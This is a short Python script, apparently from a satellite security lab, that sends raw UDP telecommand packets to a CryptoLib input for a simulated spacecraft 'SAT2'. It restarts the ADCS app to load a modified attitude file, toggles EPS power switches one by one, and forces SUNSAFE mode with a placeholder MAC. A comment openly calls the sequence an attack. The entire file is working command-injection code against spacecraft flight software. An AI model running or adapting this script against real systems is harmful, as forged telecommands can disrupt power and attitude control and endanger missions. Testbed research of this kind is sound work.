import socket
import numpy as np
import time


def send_to_socket(IP, PORT, command):

	byte_message = bytes(command)

	opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	opened_socket.sendto(byte_message, (IP, PORT))	
	
	return


######

IP = "192.168.100.5"

# for SAT2
PORT = 6012 #6012 input of CryptoLib for SAT2

# SPP labeled on the 8th octet (from 0x00 to 0x15=10+11) to sign the attack!


# RESTART APP ADCS #needed to take into account the modified Inp_ADAC.txt
command0 = [0x18,0x06,0xC0,0x00,0x00,0x15,0x06,0x15,0x41,0x44,0x43,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] 

# EPS SWITCH 'ON' 1 - 7
command1 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x00,0xAA] 
command2 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x01,0xAA] 
command3 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x02,0xAA] 
command4 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x03,0xAA] 
command5 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x04,0xAA] 
command6 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x05,0xAA] 
command7 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x06,0xAA] 
command8 = [0x19,0x1A,0xC0,0x00,0x00,0x03,0x02,0x15,0x07,0xAA] 

#set SUNSAFE mode
command9 = [0x19,0x40,0xC0,0x00,0x00,0x06,0x02,0x15,0x02, 0x30,0x30,0x30,0x30] # with MAC 0000

send_to_socket(IP, PORT, command0)
time.sleep(10)
send_to_socket(IP, PORT, command1)
time.sleep(1)
send_to_socket(IP, PORT, command2)
time.sleep(1)
send_to_socket(IP, PORT, command3)
time.sleep(1)
send_to_socket(IP, PORT, command4)
time.sleep(1)
send_to_socket(IP, PORT, command5)
time.sleep(1)
send_to_socket(IP, PORT, command6)
time.sleep(1)
send_to_socket(IP, PORT, command7)
time.sleep(1)
send_to_socket(IP, PORT, command8)
time.sleep(1)
send_to_socket(IP, PORT, command9)
time.sleep(1)

